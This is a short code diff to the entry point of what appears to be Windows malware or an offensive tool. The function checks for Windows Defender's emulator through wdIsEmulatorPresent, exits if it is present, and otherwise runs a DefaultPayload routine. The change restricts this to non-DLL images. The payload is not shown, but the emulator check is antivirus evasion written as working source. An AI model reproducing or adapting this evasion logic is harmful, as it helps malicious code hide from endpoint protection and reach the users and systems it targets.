@@ -245,8 +245,11 @@ VOID WINAPI EntryPointExeMode(
     VOID
 )
 {
-    if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
-        RtlExitUserProcess('foff');
+    BOOL IsDll = RtlImageNtHeader(GetModuleHandle(NULL))->FileHeader.Characteristics & IMAGE_FILE_DLL;
+    if (!IsDll) {
+        if (wdIsEmulatorPresent() != STATUS_NOT_SUPPORTED) {
+            RtlExitUserProcess('foff');
+        }
+        DefaultPayload();
     }
-    DefaultPayload();
 }
